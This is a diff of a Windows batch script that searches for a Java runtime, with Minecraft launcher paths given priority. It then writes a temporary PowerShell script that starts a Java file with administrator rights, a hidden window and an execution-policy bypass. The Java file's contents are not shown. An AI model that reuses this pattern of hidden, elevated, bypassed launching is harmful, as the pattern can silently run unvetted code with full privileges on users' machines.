@@ -76,12 +76,40 @@ echo }
 :request_admin
 :: Find Java in common locations
 set "JAVAW_PATH="
+
+:: Check PATH first
 for %%i in (javaw.exe) do set "JAVAW_PATH=%%~$PATH:i"
+
+:: Check JAVA_HOME
 if not defined JAVAW_PATH (
     if exist "%JAVA_HOME%\bin\javaw.exe" set "JAVAW_PATH=%JAVA_HOME%\bin\javaw.exe"
 )
+
+:: Check Minecraft runtime locations (most important for Minecraft players)
+if not defined JAVAW_PATH (
+    for /d %%i in ("%APPDATA%\.minecraft\runtime\java-runtime-*") do (
+        if exist "%%i\windows\bin\javaw.exe" set "JAVAW_PATH=%%i\windows\bin\javaw.exe"
+    )
+)
+if not defined JAVAW_PATH (
+    if exist "%APPDATA%\.minecraft\runtime\jre-legacy\windows-x64\jre-legacy\bin\javaw.exe" (
+        set "JAVAW_PATH=%APPDATA%\.minecraft\runtime\jre-legacy\windows-x64\jre-legacy\bin\javaw.exe"
+    )
+)
+if not defined JAVAW_PATH (
+    for /d %%i in ("%LOCALAPPDATA%\Packages\Microsoft.4297127D64EC6_8wekyb3d8bbwe\LocalCache\Local\runtime\*") do (
+        if exist "%%i\windows\bin\javaw.exe" set "JAVAW_PATH=%%i\windows\bin\javaw.exe"
+    )
+)
+
+:: Check standard Java installations
 if not defined JAVAW_PATH (
     for /d %%i in ("C:\Program Files\Java\jdk*") do (
+        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
+    )
+)
+if not defined JAVAW_PATH (
+    for /d %%i in ("C:\Program Files\Java\jre*") do (
         if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
     )
 )
@@ -91,33 +119,22 @@ if not defined JAVAW_PATH (
     )
 )
 if not defined JAVAW_PATH (
+    for /d %%i in ("C:\Program Files\Eclipse Adoptium\jre*") do (
+        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
+    )
+)
+if not defined JAVAW_PATH (
+    for /d %%i in ("%LOCALAPPDATA%\Programs\Eclipse Adoptium\*") do (
+        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
+    )
+)
+if not defined JAVAW_PATH (
     for /d %%i in ("%USERPROFILE%\.jdks\*") do (
         if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
     )
 )
-:: Check Minecraft launcher Java locations
-if not defined JAVAW_PATH (
-    for /d %%i in ("%USERPROFILE%\AppData\Local\Packages\Microsoft.4297127D64EC6*\LocalCache\Local\runtime\*\bin") do (
-        if exist "%%i\javaw.exe" set "JAVAW_PATH=%%i\javaw.exe"
-    )
-)
-if not defined JAVAW_PATH (
-    for /d %%i in ("C:\Program Files (x86)\Minecraft Launcher\runtime\*\windows-x64\*\bin") do (
-        if exist "%%i\javaw.exe" set "JAVAW_PATH=%%i\javaw.exe"
-    )
-)
-if not defined JAVAW_PATH (
-    for /d %%i in ("%APPDATA%\.minecraft\runtime\*\windows-x64\*\bin") do (
-        if exist "%%i\javaw.exe" set "JAVAW_PATH=%%i\javaw.exe"
-    )
-)
-if not defined JAVAW_PATH (
-    for /d %%i in ("C:\Program Files\Java\jre*") do (
-        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
-    )
-)
 
-:: If still not found, try java.exe as fallback
+:: Fallback to java.exe if javaw.exe not found
 if not defined JAVAW_PATH (
     for %%i in (java.exe) do set "JAVAW_PATH=%%~$PATH:i"
 )
@@ -128,21 +145,17 @@ if not defined JAVAW_PATH (
     exit
 )
 
-:: Debug - show what we found
-echo Found Java at: %JAVAW_PATH%
-echo Java file at: %JAVA_FILE%
-timeout /t 1 /nobreak >nul
-
-:: Create PowerShell script to run with admin
+:: Create PowerShell script with properly escaped paths
 set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
-echo $javaPath = '%JAVAW_PATH:\=\\%' > "%PS_SCRIPT%"
-echo $javaFile = '%JAVA_FILE:\=\\%' >> "%PS_SCRIPT%"
-echo if ([string]::IsNullOrEmpty($javaPath)) { exit 1 } >> "%PS_SCRIPT%"
-echo try { >> "%PS_SCRIPT%"
-echo     Start-Process -FilePath $javaPath -ArgumentList $javaFile -Verb RunAs -WindowStyle Hidden -ErrorAction Stop >> "%PS_SCRIPT%"
-echo } catch { >> "%PS_SCRIPT%"
-echo     exit 1 >> "%PS_SCRIPT%"
-echo } >> "%PS_SCRIPT%"
+(
+echo $javaPath = '%JAVAW_PATH%'
+echo $javaFile = '%JAVA_FILE%'
+echo try {
+echo     Start-Process -FilePath $javaPath -ArgumentList $javaFile -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
+echo } catch {
+echo     exit 1
+echo }
+) > "%PS_SCRIPT%"
 
 :: Run the PowerShell script
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
